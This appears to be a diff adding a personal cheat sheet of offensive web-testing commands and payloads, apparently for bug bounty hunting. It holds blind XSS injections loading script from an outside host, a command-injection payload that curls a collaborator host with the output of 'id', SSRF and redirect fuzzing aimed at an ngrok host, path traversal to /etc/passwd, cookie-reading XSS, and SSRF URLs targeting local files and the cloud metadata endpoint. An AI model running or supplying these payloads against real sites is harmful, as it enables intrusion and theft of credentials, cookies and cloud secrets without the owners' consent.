@@ -1,0 +1,42 @@
+ffuf -w /home/ibrahim/aoutput/urlsdupes.txt:FUZZ1 -w /home/ibrahim/aoutput/blindxss/headers.txt:FUZZ2 -u FUZZ1 -H <https://haxor.bxss.in>"
+
+"><script src=https://haxor.bxss.in></script>
+
+
+
+ffuf -w /home/ibrahim/aoutput/urlsdupes.txt:FUZZ1 -w /home/ibrahim/aoutput/blindxss/headers.txt:FUZZ2 -u FUZZ1 -H "FUZZ2: '><script src=https://haxor.bxss.in></script>"
+
+
+ffuf -w /home/ibrahim/aoutput/urlsdupes.txt:FUZZ1 -w /home/ibrahim/aoutput/blindxss/headers2.txt:FUZZ2 -u FUZZ1 -H "FUZZ2: '><script src=https://haxor.bxss.in></script>"
+
+
+cat armuurls.txt | grep "=" | qsreplace -a "'" | ffuf -w - -u FUZZ -x http://127.0.0.1:8080
+
+cat armyurls.txt | grep '=' | qsreplace -a " ||curl+v+http://vcbfzo4w0lcpz1wusl3i5dannet4ht.burpcollaborator.net/$(id)" | ffuf -w - -u FUZZ -r -x http://127.0.0.1:8080
+
+
+cat /home/ibrahim/Arecon/sub3.txt | gf ssrf | grep "=" | qsreplace "https://5269-197-210-52-43.eu.ngrok.io" >> /home/ibrahim/Arecon/subssrf.txt
+
+cat /home/ibrahim/Arecon/sub3.txt | gf redirect | grep "=" | qsreplace "https://5269-197-210-52-43.eu.ngrok.io" >> /home/ibrahim/Arecon/redirect.txt
+
+ffuf -u "FUZZ" -w /home/ibrahim/Arecon/redirect.txt -mc 200
+
+ffuf -u "FUZZ" -w /home/ibrahim/Arecon/subssrf.txt -mc 200
+
+
+
+
+
+
+
+//....//....//....//....//....//....//....//....//....//etc/passwd
+
+%27%3E%3Ca/+/OnMOuSeOvER%0d=%0dconfirm(document.cookie)%3Ev3dm0s
+
+“><img src=x onerror=alert(document.domain)>
+
+
+https://reducted.com/gadgets/proxy/?url=file:///etc/passwd
+
+
+https://reducted.com/gadgets/proxy/?url=http://169.254.169.254/latest/meta-data
